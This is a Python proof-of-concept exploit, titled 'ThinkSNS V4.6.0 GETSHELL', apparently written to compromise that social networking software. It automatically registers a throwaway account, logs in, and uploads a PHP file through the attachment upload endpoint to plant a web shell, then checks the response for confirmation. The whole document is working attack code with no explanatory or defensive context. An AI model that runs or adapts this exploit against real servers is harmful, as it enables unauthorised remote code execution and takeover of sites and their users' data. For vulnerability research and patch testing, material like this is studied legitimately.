#ThinkSNS V4.6.0 GETSHELL
#Author:404notfound
import requests
import random
def poc():
    username=random.randint(0,9999669)
    seed = "abcdefghijklmnopqrstuvwxyz"
    email=''.join(random.choice(seed) for i in range(8))
    email=email+"@"+email+".com"
    
    s=requests.session()
    
    #step1 registe
    register_url="http://localhost/index.php?app=public&mod=Register&act=doStep1"
    register_poc={"invate":'',"invate_key":'',"regType":"email","email":email,"uname":username,"password":"123456","repassword":"123456"}
    register_res=s.post(register_url,data=register_poc)
    
    #step2 login
    for i in range(2):
        headers={'referer':'http://localhost/index.php'}
        login_url="http://localhost//index.php?app=public&mod=Passport&act=doLogin"
        login_poc={"login_email":email,"login_password":"123456","login_remember":"1"}
        login=s.post(login_url,data=login_poc,headers=headers)
        #step3 load poc
        attack_url='http://localhost/index.php?app=public&mod=attach&act=ajaxUpload'
        headers={'referer':'http://localhost/index.php'}
        files={'file':open('c://Python27/1.PHP','rb')}
        attack=s.post(attack_url,files=files,headers=headers)
        #step4 find verified information
        if "save_name" in attack.content:
            return True

#poc()
